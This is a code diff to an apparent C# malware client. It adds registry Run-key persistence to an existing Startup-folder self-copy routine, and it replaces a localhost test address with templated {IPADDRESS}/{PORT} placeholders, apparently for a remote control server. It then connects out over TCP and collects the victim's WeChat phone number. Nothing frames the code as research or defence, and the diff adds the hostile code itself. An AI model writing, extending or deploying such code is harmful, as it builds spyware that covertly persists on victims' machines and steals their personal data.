@@ -17,28 +17,47 @@ class Program
     public static void AutoRun()
     {
         string sourceFilePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+        string fileName = Path.GetFileName(sourceFilePath);
 
         string userStartupFolderPath = Path.Combine(
             Environment.GetFolderPath(Environment.SpecialFolder.Startup),
-            Path.GetFileName(sourceFilePath)
+            fileName
         );
 
         string commonStartupFolderPath = Path.Combine(
             @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
-            Path.GetFileName(sourceFilePath)
+            fileName
         );
+
+        string registryKeyName = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+        using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(registryKeyName, true))
+        {
+            key.SetValue(Path.GetFileNameWithoutExtension(fileName), sourceFilePath);
+        }
+
+        try
+        {
+            using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(registryKeyName, true))
+            {
+                key.SetValue(Path.GetFileNameWithoutExtension(fileName), sourceFilePath);
+            }
+        }
+        catch (System.Security.SecurityException)
+        {
+        }
 
         MoveFileEx(sourceFilePath, userStartupFolderPath, MOVEFILE_DELAY_UNTIL_REBOOT);
         MoveFileEx(sourceFilePath, commonStartupFolderPath, MOVEFILE_DELAY_UNTIL_REBOOT);
     }
+
     static async Task Main(string[] args)
         {
             AutoRun();
 
-            //string serverAddress = "{IPADDRESS}";
-            //int serverPort = {PORT};
-            string serverAddress = "127.0.0.1";
-            int serverPort = 2026;
+            string serverAddress = "{IPADDRESS}";
+            int serverPort = int.Parse("{PORT}");
+            //string serverAddress = "127.0.0.1";
+            //int serverPort = 2026;
             client = new TCPClient(serverAddress, serverPort);
             string phone = await GetWeChatInfo.Get();
 
